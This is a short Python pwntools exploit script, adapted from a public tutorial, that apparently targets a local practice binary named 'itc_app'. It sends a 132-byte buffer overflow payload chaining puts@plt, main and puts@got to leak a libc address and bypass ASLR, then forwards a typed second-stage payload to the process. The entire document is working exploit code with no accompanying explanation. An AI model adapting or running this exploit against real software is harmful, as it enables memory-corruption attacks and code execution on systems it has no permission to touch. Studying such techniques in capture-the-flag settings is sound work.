#Adapted from https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass#final-exploit

from pwn import *

elf = context.binary = ELF('./itc_app')
libc = elf.libc
proc = process()


payload = flat(
    b'A' * 132,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)
proc.sendline(payload)
welcome = False
for i in range(10):
    line = proc.recvline()
    if welcome and b"Welcome" in line:
        leakedAddr= int.from_bytes(prevLine[:4], byteorder='little')
        print("Leaked puts' libc Addr: "+hex(leakedAddr))
    if b"Welcome" in line:
        welcome = True
    prevLine = line
    try:
        print(line)
    except UnicodeDecodeError:
        print(line)
    except EOFError:
        break
proc.sendline(input().encode('utf-8'))
while True:
    try:
        print(proc.recvline().strip())
    except UnicodeDecodeError:
        print(proc.recvline())
    except EOFError:
        break